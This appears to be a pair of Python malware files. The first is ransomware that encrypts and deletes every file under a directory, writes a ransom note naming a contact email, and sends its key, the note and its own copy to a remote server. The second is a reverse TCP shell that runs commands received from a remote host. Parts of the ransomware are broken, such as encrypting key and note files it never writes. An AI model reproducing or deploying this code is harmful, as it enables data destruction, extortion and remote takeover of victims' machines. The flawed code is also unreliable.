# create a ransomware that encrypts all files in a directory
# and appends .encrypted to the end of the file name
# and creates a ransom note
# and deletes the original file
# and creates a key file
# and sends the key file to a remote server
# and deletes the key file
# and sends the ransom note to a remote server
# and deletes the ransom note
# and sends the ransomware to a remote server
# and deletes the ransomware

exit()  # this is here to prevent the ransomware from executing on accident

import os
import sys
import socket
import random
import string
import base64
import hashlib
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# create a ransom note
def ransom_note():
    ransom_note = """
    All your files have been encrypted.
    To decrypt your files, send an email to
    cire.notrub.nitram@gmail.com
    with the following key:
    """
    return ransom_note

# create a key file
def key_file():
    key = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))
    return key

# encrypt a file
def encrypt_file(file_name, key):
    # create a cipher object
    cipher = AES.new(key, AES.MODE_EAX)
    # read the
    with open(file_name, 'rb') as f:
        data = f.read()
    # encrypt the data
    ciphertext, tag = cipher.encrypt_and_digest(data)
    # write the encrypted data to a file
    with open(file_name + '.encrypted', 'wb') as f:
        [ f.write(x) for x in (cipher.nonce, tag, ciphertext) ]

# send a file to a remote server
def send_file(file_name, host, port):
    # create a socket object
    s = socket.socket()
    # connect to the remote server
    s.connect((host, port))
    # send the file
    with open(file_name, 'rb') as f:
        while True:
            # read 1024 bytes from the file
            bytes_read = f.read(1024)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in
            # busy networks
            s.sendall(bytes_read)
    # the file has been sent
    s.close()

# delete a file
def delete_file(file_name):
    os.remove(file_name)

# get the list of files in a directory
def get_file_list(dir_name):
    file_list = []
    for root, dirs, files in os.walk(dir_name):
        for file in files:
            file_list.append(os.path.join(root, file))
    return file_list

# main
def main():
    # get the list of files in the current directory
    file_list = get_file_list('.')
    # create a ransom note
    ransom = ransom_note()
    # create a key file
    key = key_file()
    # add the key to the ransom note
    ransom += key
    # encrypt the ransom note
    encrypt_file('ransom.txt', key)
    # send the ransom note to a remote server
    send_file('ransom.txt.encrypted', 'host', 8000)
    # delete the ransom note
    delete_file('ransom.txt.encrypted')
    # encrypt the key file
    encrypt_file('key.txt', key)
    # send the key file to a remote server
    send_file('key.txt.encrypted', 'host', 8000)
    # delete the key file
    delete_file('key.txt.encrypted')
    # encrypt the ransomware
    encrypt_file(sys.argv[0], key)
    # send the ransomware to a remote server
    send_file(sys.argv[0] + '.encrypted', 'host', 8000)
    # delete the ransomware
    delete_file(sys.argv[0] + '.encrypted')
    # encrypt all the files in the current directory
    for file in file_list:
        encrypt_file(file, key)
        # delete the original file
        delete_file(file)

if __name__ == '__main__':
    main()

    

# Path: Malware\Reverse_TCP_Shell.py
# create a reverse TCP shell
# and send it to a remote server
# and delete the shell

import socket
import os
import subprocess

# create a reverse TCP shell
def reverse_tcp_shell(host, port):
    # create a socket object
    s = socket.socket()
    # connect to the remote server
    s.connect((host, port))
    # receive a command from the remote server
    while True:
        data = s.recv(1024)
        if data[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode('utf-8'))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, 'utf-8')
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
    # close the connection
    s.close()

# send a file to a remote server
def send_file(file_name, host, port):
    # create a socket object
    s = socket.socket()
    # connect to the remote server
    s.connect((host, port))
    # send the file
    with open(file_name, 'rb') as f:
        while True:
            # read 1024 bytes from the file
            bytes_read = f.read(1024)
            if not bytes_read:
                # file transmitting is done
                break
            # we use sendall to assure transimission in
            # busy networks
            s.sendall(bytes_read)
    # the file has been sent
    s.close()

# delete a file
def delete_file(file_name):
    os.remove(file_name)

# main
def main():
    # send the reverse TCP shell to a remote server
    send_file('reverse_tcp_shell.py', 'host', 8000)
    # delete the reverse TCP shell
    delete_file('reverse_tcp_shell.py')
    # create a reverse TCP shell
    reverse_tcp_shell('host', 8000)

if __name__ == '__main__':
    main()


